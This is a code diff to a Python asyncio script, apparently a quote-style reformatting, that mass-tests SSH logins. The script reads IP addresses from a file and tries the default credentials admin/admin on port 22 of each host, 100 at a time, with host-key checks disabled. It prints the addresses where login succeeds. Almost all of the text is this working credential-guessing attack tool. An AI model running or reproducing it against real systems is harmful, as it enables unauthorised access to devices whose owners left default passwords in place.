@@ -10,30 +10,29 @@ from ..parallel import progressbar_execute
 
 async def ssh_brute(ip: str, port: int, username: str, password: str):
     common_opts = {
-        'known_hosts': None,
-        'preferred_auth': ['keyboard-interactive', 'password'],
-        'kex_algs': '*',
-        'encryption_algs': '*',
-        'mac_algs': '*',
+        "known_hosts": None,
+        "preferred_auth": ["keyboard-interactive", "password"],
+        "kex_algs": "*",
+        "encryption_algs": "*",
+        "mac_algs": "*",
     }
     brute_opts = {
-        'host': ip,
-        'port': port,
-        'username': username,
-        'password': password,
-        'connect_timeout': 2,
-        'login_timeout': 10,
+        "host": ip,
+        "port": port,
+        "username": username,
+        "password": password,
+        "connect_timeout": 2,
+        "login_timeout": 10,
     }
     async with asyncssh.connect(**(common_opts | brute_opts)):
-        return f'{ip}'
+        return f"{ip}"
 
 
 async def main() -> None:
     parser = argparse.ArgumentParser()
-    parser.add_argument('infile', type=argparse.FileType('r'))
+    parser.add_argument("infile", type=argparse.FileType("r"))
     args = parser.parse_args()
-    coros = [ssh_brute(ip, 22, 'admin', 'admin')
-             for ip in ips_from_file(args.infile)]
+    coros = [ssh_brute(ip, 22, "admin", "admin") for ip in ips_from_file(args.infile)]
     async for fut in progressbar_execute(coros, 100):
         try:
             res = fut.result()
@@ -49,6 +48,7 @@ async def main() -> None:
         except TimeoutError:
             pass
         except Exception as e:
-            print(colored(repr(e), 'red'))
+            print(colored(repr(e), "red"))
+
 
 asyncio.run(main())
